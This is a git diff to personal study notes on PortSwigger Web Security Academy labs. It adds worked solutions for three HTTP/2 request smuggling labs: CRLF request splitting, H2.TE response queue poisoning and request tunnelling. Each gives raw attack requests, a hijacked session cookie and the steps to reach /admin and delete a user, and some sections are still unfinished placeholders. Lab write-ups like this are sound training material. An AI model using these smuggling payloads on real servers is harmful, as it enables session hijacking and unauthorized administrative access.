@@ -15,7 +15,7 @@
 - [Seven Seas Security - Portswigger walkthrough](https://www.youtube.com/@7SeasSecurity)
 
 # Table of Contents
-**Server-side topics (13~113 labs)**
+**Server-side topics (14~115 labs)**
 - [SQL Injection](#sql-injection)
   - [Lab](#sql-injection-lab)
 - [Path Traversal](#path-traversal)
@@ -42,6 +42,8 @@
   - [Lab](#xxe-injection)
 - [API](#api)
   - [Lab](#api)
+- [Web cache deception](##web-cache-deception)
+  - [Lab](#web-cache-deception)
 
 **Client-side topics (6-61 labs)**
 - [CSRF (Cross-Site Request Forgery)](#csrf-cross-site-request-forgery)
@@ -1614,7 +1616,12 @@ CONNECT
     Result: 54iz54pjco7znfuihs9d9y4q13nilbm4   
   - Access forgot password page of Admin   
     https://0a4d00e204437cd0804f0d9c00b7004e.web-security-academy.net/forgot-password?passwordResetToken=[YOUR TOKEN]
-    
+
+## Web cache deception
+d......
+
+### Web cache deception Lab
+
 ## WebSockets
 - WebSocket connections are initiated over HTTP and are typically long-lived. essages can be sent in either direction at any time and are not transactional in nature.
 - `var ws = new WebSocket("wss://normal-website.com/chat");`
@@ -4441,9 +4448,112 @@ Response: Communication timed out. (chunked size is 5)
     search=x
     ```
   - refresh page > if you see a 404 response > refresh > victim request > grab the session cookie
-- dd
-- dd
-- dd
+- **HTTP/2 request splitting** via CRLF injection
+  - Info: This lab is vulnerable to request smuggling because the **front-end server downgrades HTTP/2** requests and fails to adequately sanitize incoming headers. To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 10 seconds.
+  - https://www.youtube.com/watch?v=ZxL2qanRLuw  
+  - Add request header  
+    ```
+    GET / HTTP/2
+
+    Request header
+    name: foo
+    value:
+    bar\r\n
+    \r\n
+    GET /x HTTP/1.1\r\n
+    Host: YOUR-LAB-ID.web-security-academy.net
+    ```
+  - Repeat the request until you get 302 found then copy the session cookie  
+    ```
+    HTTP/2 302 Found
+    Location: /my-account?id=administrator
+    Set-Cookie: session=UBfQLjcbDIDTMTWRLhTQx7e1fyRaJ4XC; Secure;
+    ```
+  - Delete carlos  
+    ```
+    GET /admin/delete?username=carlos HTTP/2
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Cookie: session=UBfQLjcbDIDTMTWRLhTQx7e1fyRaJ4XC
+
+    ```
+- **Response queue poisoning via H2.TE** request smuggling
+  - Info: This lab is vulnerable to request smuggling because the **front-end server downgrades HTTP/2 requests even if they have an ambiguous length**. To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 15 seconds.
+  - https://www.youtube.com/watch?v=PeYdUHME7e8
+  - Confirm the vulnerability. Smuggling an arbitrary prefix in the body of an HTTP/2 request using chunked encoding. Get 404 respopnse, caused the back-end to append the subsequent request to the smuggled prefix
+    ```
+    POST / HTTP/2
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Transfer-Encoding: chunked
+
+    0
+
+    SMUGGLED
+    ```
+  - Send the request to poison the response queue. You will receive the 404 response to your own request.  Repeat this process until you capture a 302.
+    ```
+    POST /x HTTP/2
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Transfer-Encoding: chunked 
+
+    0
+
+    GET /x HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net\r\n
+    \r\n 
+    ```
+  - Alternatively, use intruder to repeat the above attack
+    - position: clear $
+    - payload: null payloads > continue indefinitely
+    - resource pool: max 1 concurrent request, delay 800 miliseconds
+    - setting: uncheck "update content-length header"
+    - start atttack: filter by 302 response code
+  - Copy the session cookie and delete carlos user
+- **Bypassing access controls via HTTP/2 request tunnelling (Expert)**
+  - Info: This lab is vulnerable to request smuggling because the **front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming header names**. To solve the lab, access the admin panel at /admin as the administrator user and delete the user carlos.
+  - Confirming the vulnerability. Append an arbitrary header to the end of the request and try smuggling a Host header in its name.
+    ```
+    GET /
+
+    Request header
+    name
+    foo: bar\r\n
+    Host: abc
+    
+    value: xyz
+    ```
+  - Add an arbitrary header and use its name field to inject a large Content-Length header and an additional search parameter as follows
+    ```
+    Request header
+    name
+    foo: bar\r\n
+    Content-Length: 500\r\n
+    \r\n
+    search=x
+
+    value: xyz
+    ```
+  - In the main body of the request (in the message editor panel) append arbitrary characters to the original search parameter until the request is longer than the smuggled Content-Length header
+    ```
+    0 search results for 'x: xyz
+    Content-Length: 644
+    cookie: session=YOUR-SESSION-COOKIE
+    X-SSL-VERIFIED: 0
+    X-SSL-CLIENT-CN: null
+    X-FRONTEND-KEY: YOUR-UNIQUE-KEY
+    ```
+  - Change the request method to HEAD and edit your malicious header so that it smuggles a request for the admin panel. Include the three client authentication headers
+    ```
+    foo: bar
+    
+    GET /admin HTTP/1.1
+    X-SSL-VERIFIED: 1
+    X-SSL-CLIENT-CN: administrator
+    X-FRONTEND-KEY: YOUR-UNIQUE-KEY\r\n
+    \r\n
+
+    value: xyz
+    ```
+  - dd
 - dd
 - dd
 - dd 
